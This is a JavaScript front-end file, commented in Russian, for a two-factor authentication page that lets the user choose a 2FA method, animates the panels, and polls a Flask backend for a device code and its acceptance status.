$(document).ready(function() {
    
    const nextButton = document.getElementById('select-option');
    const body1 = document.getElementById('body-1');
    //   var body2 = document.getElementById('body-2');
    const content1 = document.getElementById('content-1');
    //   const content2 = document.getElementById('content-2');
    const head1 = document.getElementById('head-1');
    //   var head2 = document.getElementById('head-2');
    const loader = document.querySelector('.loader');
    const card = document.querySelector('.card');

    nextButton.addEventListener('click', function() {
        var selectedOption = document.querySelector('input[name="2fa-type"]:checked').value;
        var body2 =  document.getElementById(selectedOption + '-form');
        var content2 = document.getElementById(selectedOption + '-content-2');
        var head2 = document.getElementById(selectedOption + '-head-2');
        if (selectedOption == 'code-from-device') {
            device();
        }
        console.log(selectedOption);
        loader.style.display = 'block';
        loader.style.opacity = 1;
        card.style.opacity = '0.5'; // Сделать окно полупрозрачным
        card.style.overflow = 'hidden'; // Скрыть контент за пределами карты

        gsap.to(content1, {
        x: '-150%', // перемещение body1 за левую границу
        duration: 0.5,
        onStart: function() {
            loader.style.opacity = '1'; // Сделать лоадер непрозрачным перед анимацией
        },
        onComplete: function() {
            body1.style.display = 'none'; // скрыть body1
            body2.style.display = 'block'; // показать body2

            // Сразу сменить заголовок без анимации
            head1.style.display = 'none';
            head2.style.display = 'block';

            // Анимация для контента
            gsap.from(content2, { x: '100%', duration: 0.5, onComplete: hideExcessContent });
        }
        });

        setTimeout(function() {
        loader.style.display = 'none'; // Скрыть индикатор загрузки
        card.style.opacity = '1'; // Вернуть окно в обычное состояние
        }, 1500);
    });

    function hideExcessContent() {
        content1.style.display = 'none'; // Скрыть остатки контента body1
        content2.style.position = 'relative'; // Убедиться, что body2 остаётся в пределах карты
        card.style.overflow = 'visible'; // Показать весь контент body2
    }
    function checkIsAcceptedDCODE() {
        $.ajax({
            type: "GET",
            url: "/check_is_accepted_device",  // Предполагается, что это будет ваш маршрут Flask для проверки значения is_accepted
            success: function(response) {
                console.log(response[0]);
                if (response[0] == "Yes") {
                    // Если значение is_accepted равно 'Yes', перенаправить на одну страницу
                    window.location.href = "/";
                } else if (response[0] == "No") {
                    // Если значение is_accepted равно 'No', перенаправить на другую страницу
                    $("#result").text("Генерация нового кода..");
                    setTimeout(checkcode, 5000);
                } else {
                    // Если значение не 'Yes' или 'No', продолжить опрос через 5 секунд
                    setTimeout(checkIsAcceptedDCODE, 5000);
                }
            },
            error: function(error) {
                console.error("Ошибка при проверке значения is_accepted");
                setTimeout(checkIsAcceptedDCODE, 5000);
            }
        });
    }
    function checkcode() {
            $.ajax({
                type: "GET",
                url: "/getcode",  // Предполагается, что это будет ваш маршрут Flask для проверки значения is_accepted
                success: function(response) {
                    console.log(response[0]);
                    if (response != "None") {
                        document.getElementById('result').innerHTML = 'Нажмите следующий код на вашем устройстве: ' + response[0];
                        checkIsAcceptedDCODE();
                    }  else if(response == "None") {
                        // Если значение не 'Yes' или 'No', продолжить опрос через 5 секунд
                        setTimeout(checkcode, 5000);
                    }
                },
                error: function(error) {
                    console.error("Ошибка при проверке значения code")
                
                    setTimeout(checkcode, 5000);
                }
            });
        }
        function device() {
            $.ajax({
                type: "POST",
                headers: {"Content-Type": "application/json"},
                url: "/device",
                data: {
                    key1: 'pss'
                }, 
                success: function(response) {
                    console.log(response)
                    setTimeout(checkcode(), 5000);
                },
                error: function(error) {
                    console.error("Ошибка при post");
                    console.error(error);
                }
            });
        }
});